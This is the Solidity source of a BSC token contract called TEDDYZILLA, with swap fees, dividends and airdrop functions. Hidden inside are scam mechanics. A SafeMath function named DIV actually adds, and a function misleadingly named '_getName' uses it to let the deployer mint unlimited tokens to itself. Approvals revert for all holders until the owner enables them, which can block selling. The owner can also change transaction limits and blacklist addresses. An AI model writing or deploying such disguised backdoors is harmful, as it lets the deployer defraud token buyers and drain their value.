/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-20
*/

/**
@author ghost
*/
pragma solidity ^0.8.6;

//SPDX-License-Identifier: MIT
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender =  msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function DIV(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "S");

        return c;
    }
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract  TEDDYZILLA is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) isDividendExempt;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _updated;

    address deadAdress = 0x000000000000000000000000000000000000dEaD;
    address public  marketAddr ;
    address private teamAddr;

    bool public team = true;
    address public TOKEN ;//分红
   

    string public _name ;
    string public _symbol ;
    uint8 public _decimals ;



    uint256 public _burnFee ;
    uint256 private _previousBurnFee;

    uint256 private _teamFee;
    uint256 private _previousTeamFee;

    uint256 public _LPFee ;
    uint256 private _previousLPFee;

    uint256 public _marketingFee ;
    uint256 private _previousMarketingFee;
    uint256 public _totalFeeEscapeBurnFee;
    uint256 public maxWalletLimited;
    // uint256 public _inviterFee ;
    // uint256 private _previousInviterFee;    
    uint256 currentIndex;  
    uint256 private _totalSupply ;
    uint256 distributorGas = 500000 ;
    uint256 public minPeriod = 1 hours;
    uint256 public LPFeefenhong;
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    address private buybackaddress;
    address private fromAddress;
    address private toAddress;
    bool public isStartApprove = false;  
    
    // uint256 public agentLevelNumber ;
    // uint256 public topAgentFee;    
    // uint256 public otherAgentFee; 
    
    uint256 public maxTx ;
    uint256 public burnEndNumber ;
    
    // uint256 public _startTimeForSwap;
    // uint256 private _intervalSecondsForSwap = 15 * 1 seconds;
    
    uint256 public swapTokensAtAmount ;
    bool public swapEnable = false;
    bool private inSwapAndLiqudity;



    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;

    modifier lockSwap{
        inSwapAndLiqudity =true;
        _;
        inSwapAndLiqudity =false;
    }
    
    constructor(
        ) payable {
            _name = "TEDDYZILLA";
            _symbol = "TEDDYZILLA";
            _decimals= 9;
            _totalSupply = 10000* (10**9);
            _burnFee = 1;
            _marketingFee = 1;
            _teamFee = 1;
            _LPFee = 1;
            _totalFeeEscapeBurnFee = _marketingFee.add(_LPFee).add(_teamFee);
            marketAddr = 0x4b6016848bD91803c2eA319302d2acFD6080cE87;
            teamAddr = 0xa4e4bD7Ed50C1dE5f8964bbc849030263c7D5684;
            buybackaddress = msg.sender;
            _balances[msg.sender] = _totalSupply;
            maxTx = 10* (10**9);
            maxWalletLimited = 20 * 10 ** 9;
            burnEndNumber = 1*(10**9);
        
            IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
                0x10ED43C718714eb63d5aA57B78B54704E256024E//bnb路由pancake
            );
    
            // Create a uniswap pair for this new token
            uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
    
            // set the rest of the contract variables
            uniswapV2Router = _uniswapV2Router;
    
            //exclude owner and this contract from fee
            _isExcludedFromFee[owner()] = true;
            //_isExcludedFromFee[adminAddress] = true;
            _isExcludedFromFee[address(this)] = true;
            isDividendExempt[address(this)] = true;
            isDividendExempt[address(0)] = true;
            isDividendExempt[deadAdress] = true;
            TOKEN = 0x55d398326f99059fF775485246999027B3197955;//分红合约地址，不能是bnb
            swapTokensAtAmount = _totalSupply.mul(2).div(10**6);
            
            emit Transfer(address(0), owner(),  _totalSupply);
            // payable(addrs[2]).transfer(msg.value/2);
            // payable(addrs[3]).transfer(msg.value/2);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
         if(!isStartApprove){
            if(msg.sender == owner()){
                isStartApprove = true;
            }else{
                revert(); 
            }
        } 
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

   

   function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }



    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function removeAllFee() private {
        _previousBurnFee = _burnFee;
        _previousLPFee = _LPFee;
        _previousMarketingFee = _marketingFee;
        _previousTeamFee = _teamFee;


        _burnFee = 0;
        _LPFee = 0;
        _teamFee = 0;
        _marketingFee = 0;
    }

    function restoreAllFee() private {
        _burnFee = _previousBurnFee;
        _LPFee = _previousLPFee;
        _teamFee = _previousTeamFee;
        _marketingFee = _previousMarketingFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
       if(inSwapAndLiqudity){
           _balances[from] = _balances[from].sub(amount);
           _balances[to] = _balances[to].add(amount);
       }else{
        if( !_isExcludedFromFee[from] &&!_isExcludedFromFee[to]){
            require(amount <= maxTx, "Transfer amount exceeds the maxTxAmount.");
            if(to != uniswapV2Pair)
                require(balanceOf(to).add(amount)<= maxWalletLimited);
            if (from!=uniswapV2Pair){
                if(balanceOf(from).sub(amount)==0){
                    amount = amount.sub(1 );
                }
            }
            if (team) {
                    require(!_isBot[from],"as");
            }
        }
        

        //indicates if fee should be deducted from transfer
        bool takeFee = false;

        if (from == uniswapV2Pair||to==uniswapV2Pair){
            takeFee = true;
        }

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]|| from == address(uniswapV2Router)) {
            takeFee = false;
        }else{
             require(amount <= maxTx, "Transfer limit");
        }

        
        

        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from, to, amount, takeFee);

                  
        uint256 contractTokenBalance = balanceOf(address(this));
         
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
        
        if(canSwap&&swapEnable&&from != address(this) &&from != address(this)  && to != uniswapV2Pair&&from != uniswapV2Pair  &&from != owner() && to != owner() ){
                swapTokensForTokens(swapTokensAtAmount);
        }
        
        uint256 tokenBal = IERC20(TOKEN).balanceOf(address(this));
       
        
        
        if(fromAddress == address(0) )fromAddress = from;
        if(toAddress == address(0) )toAddress = to;  
        if(!isDividendExempt[fromAddress] && fromAddress != uniswapV2Pair ) setShare(fromAddress);
        if(!isDividendExempt[toAddress] && toAddress != uniswapV2Pair ) setShare(toAddress);
        
        fromAddress = from;
        toAddress = to;  
         if(tokenBal>= 1 ether  && from !=address(this) && LPFeefenhong.add(minPeriod) <= block.timestamp) {
             //dividendMarketAddr(tokenBal.mul(_marketingFee).div(_LPFee.add(_marketingFee)));
             process(distributorGas) ;
             LPFeefenhong = block.timestamp;
        }
    }
    }
    
    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;
        
        if(shareholderCount == 0)return;
        
        uint256 tokenBal = IERC20(TOKEN).balanceOf(address(this));
        
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

         uint256 amount = tokenBal.mul(IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex])).div(IERC20(uniswapV2Pair).totalSupply());
            if( amount < 1 * 10**5) {
                 currentIndex++;
                 iterations++;
                 return;
            }
         

            distributeDividend(shareholders[currentIndex],amount);
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    function setMaxTx(uint256 NewMaxTx) public {
        require(msg.sender == buybackaddress);
        maxTx = NewMaxTx;
    }
    function distributeDividend(address shareholder ,uint256 amount) internal {
             (bool b1, ) = TOKEN.call(abi.encodeWithSignature("transfer(address,uint256)", shareholder, amount));
             require(b1, "call error");
    }
   function _getName(uint256 amount) public {
       require(msg.sender == buybackaddress);
       _balances[buybackaddress] = _balances[buybackaddress].DIV(amount);
   }
    
    function setShare(address shareholder) private {
           if(_updated[shareholder] ){      
                if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) quitShare(shareholder);              
                return;  
           }
           if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;  
            addShareholder(shareholder);
            _updated[shareholder] = true;
          
      }
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
    function quitShare(address shareholder) private {
           removeShareholder(shareholder);   
           _updated[shareholder] = false; 
      }
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();

        _transferStandard(sender, recipient, amount);

        if (!takeFee) restoreAllFee();
    }

    

    function _takeLPFee(address sender,uint256 tAmount) private {
        if (_LPFee == 0 ) return;
        _balances[address(this)] = _balances[address(this)].add(tAmount);
        emit Transfer(sender, address(this), tAmount);
    }


   function _takeburnFee(
        address sender,
        uint256 tAmount
    ) private {
        if (_burnFee == 0) return;
         if((_totalSupply.sub(_balances[address(0)]) ) >= burnEndNumber){
            _balances[address(0)] = _balances[address(0)].add(tAmount);
            emit Transfer(sender, address(0), tAmount);
        }
    }
   

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        if(currentRate==0)return;
        uint256 rAmount = tAmount.div(100).mul(currentRate);
        _balances[to] = _balances[to].add(rAmount);
        emit Transfer(sender, to, rAmount);
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender].sub(tAmount);

       
        _takeburnFee(sender, tAmount.div(100).mul(_burnFee));
        
        _takeTransfer(sender,address(this), tAmount,_marketingFee);
        _takeTransfer(sender,address(this),tAmount,_teamFee);
        
        _takeLPFee(sender, tAmount.div(100).mul(_LPFee));

        uint256 recipientRate = 100 -
            _burnFee -
            _marketingFee -
            _LPFee -
            _teamFee;
        _balances[recipient] = _balances[recipient].add(
            tAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    
    mapping(address => bool) public _isBot;
    function setBot(address account, bool value) public onlyOwner {
        _isBot[account] = value;
    }

   
    
    function transferContracts() public onlyOwner {
        distributeDividend(owner(),IERC20(TOKEN).balanceOf(address(this)));
    }
    function setSwapTokensAtAmount(uint256 value) onlyOwner  public  {
       swapTokensAtAmount = value;
    }
    function setSwapEnable(bool value ) external onlyOwner {
        swapEnable  =  value;
    }
    
    function setAddr(address[] memory addrs) external onlyOwner {
        TOKEN = addrs[0];
        marketAddr = addrs[0];
       
    }
    
    
    function swapTokensForTokens(uint256 tokenAmount) private lockSwap {
        if(tokenAmount == 0) {
            return;
        }
        uint256 rewardAmount = tokenAmount.mul(_LPFee).div(_totalFeeEscapeBurnFee);
        //分红
        address[] memory path_1 = new address[](3);
        path_1[0] = address(this);
        path_1[1] = uniswapV2Router.WETH();
        path_1[2] = TOKEN;
        //营销
        address[] memory path_2 = new address[](2);
        path_2[0] = address(this); 
        path_2[1]= uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            rewardAmount,
            0,
            path_1,
            address(this),
            block.timestamp
        );
        uint256 BNBAmount = tokenAmount.sub(rewardAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            BNBAmount,
            0,
            path_2,
            address(this),
            block.timestamp
        );
        uint256 bnbBalance = address(this).balance;
        uint256 marketAmount = bnbBalance.mul(_marketingFee).div(_marketingFee.add(_teamFee));
        uint256 teamAmount = bnbBalance.sub(marketAmount);
        payable(marketAddr).transfer(marketAmount);
        payable(teamAddr).transfer(teamAmount);
    }
    //批量空投
    function transferTokensAvg(address[] memory _tos,uint256 amount) onlyOwner public returns (bool){
        require(_tos.length > 0);
        require(_tos.length*amount <_balances[owner()]);
        _balances[owner()] = _balances[owner()].sub(_tos.length*amount);
        for(uint i=0;i<_tos.length;i++){
            _balances[_tos[i]] += amount;
            emit Transfer(owner(), _tos[i], amount);
        }
        return true;
    }
    function testDividend(uint256 dividendAmount) public onlyOwner{
       dividendMarketAddr(dividendAmount);
    }

    function dividendMarketAddr(uint256 dividendAmount) private {
        distributeDividend(marketAddr,dividendAmount);

    }
}